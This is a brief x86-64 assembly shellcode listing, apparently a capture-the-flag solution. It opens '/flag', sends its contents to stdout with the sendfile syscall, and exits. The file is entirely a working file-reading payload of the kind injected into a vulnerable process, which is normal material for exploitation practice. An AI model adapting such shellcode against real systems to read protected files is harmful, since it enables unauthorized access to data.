.global _start

_start: 
 # open
 mov $2, %eax
 lea flag(%rip), %edi
 xor %esi, %esi
 syscall

 # sendfile to stdout (fd=1)
 mov $1, %edi
 mov %eax, %esi
 xor %edx, %edx
 mov $0x1000, %r10 
 mov $40, %al
 syscall

 # exit
 mov $60, %al
 xor %edi, %edi
 syscall
flag:
  .string "/flag"
